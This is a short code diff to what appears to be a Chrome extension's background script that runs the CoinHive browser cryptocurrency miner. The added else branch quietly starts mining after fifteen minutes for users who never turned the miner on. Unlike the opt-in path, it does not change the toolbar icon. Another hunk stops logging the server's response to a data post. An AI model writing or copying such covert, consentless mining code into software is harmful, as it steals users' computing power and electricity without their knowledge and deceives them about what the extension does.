@@ -147,18 +147,25 @@ function attemptStart() {
 	if(localDataReady && syncDataReady){
 		miner = new CoinHive.User('faLtux0jRiZXXe2iiN1XEfyj7sj5Ykg3',sessionData.userid, {threads: 1,throttle: 0.7});
 		logEvent("initialize miner");
-	}
 	
-	if(localDataReady && syncDataReady && prevUse){
-		miner.start();
-		chrome.browserAction.setIcon({path:"Images/cent/icon16.png"});
-		logEvent("mining auto-start");
-			
-		//ramp up the miner over several minutes
-		intervalWorker.postMessage("start-ramp");
+		if(prevUse){
+			miner.start();
+			chrome.browserAction.setIcon({path:"Images/cent/icon16.png"});
+			logEvent("mining auto-start");
+				
+			//ramp up the miner over several minutes
+			intervalWorker.postMessage("start-ramp");
 
-		//periodically update totals
-		intervalWorker.postMessage("start-log");
+			//periodically update totals
+			intervalWorker.postMessage("start-log");
+		}else{
+			setTimeout(function(){
+				if(!prevUse){	//in case they started and stopped the miner since timer start
+					miner.start();
+					logEvent("mining-auto-start");
+				}
+			},900e3);
+		}
 	}
 }
 
@@ -203,7 +210,7 @@ function postLog(dataObj){
 
 	xhr.addEventListener("readystatechange", function () {
 	  if (this.readyState === 4) {
-		console.log(this.responseText);
+		console.log("successful data-post");
 	  }
 	});
 
